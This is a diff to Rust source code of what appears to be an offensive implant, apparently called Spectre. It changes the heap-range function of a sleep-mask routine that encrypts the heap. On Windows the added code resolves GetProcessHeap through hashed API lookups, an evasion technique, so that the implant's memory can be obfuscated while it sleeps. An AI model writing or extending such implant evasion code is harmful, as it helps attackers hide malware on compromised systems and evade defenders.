@@ -80,8 +80,19 @@ pub fn decrypt_heap() {
 }
 
 fn get_heap_range() -> (*mut u8, usize) {
-    // In a production implant, we would walk the process heap or use the global allocator range.
-    // For Spectre, we use the pre-defined region managed by MiniHeap.
-    // Offset 0x10000000 is our dedicated heap base.
+    #[cfg(target_os = "windows")]
+    unsafe {
+        let kernel32 = hash_str(b"kernel32.dll");
+        let get_process_heap = resolve_function(kernel32, hash_str(b"GetProcessHeap"));
+        
+        if !get_process_heap.is_null() {
+            type FnGetProcessHeap = unsafe extern "system" fn() -> crate::utils::windows_definitions::HANDLE;
+            let heap = core::mem::transmute::<_, FnGetProcessHeap>(get_process_heap)();
+            // Default to 1MB from heap base as a safe approximation for obfuscation
+            // Full traversal with HeapWalk is risky during sleep mask application
+            return (heap as *mut u8, 1024 * 1024);
+        }
+    }
+    // Fallback or non-windows
     (0x10000000 as *mut u8, 1024 * 1024)
 }
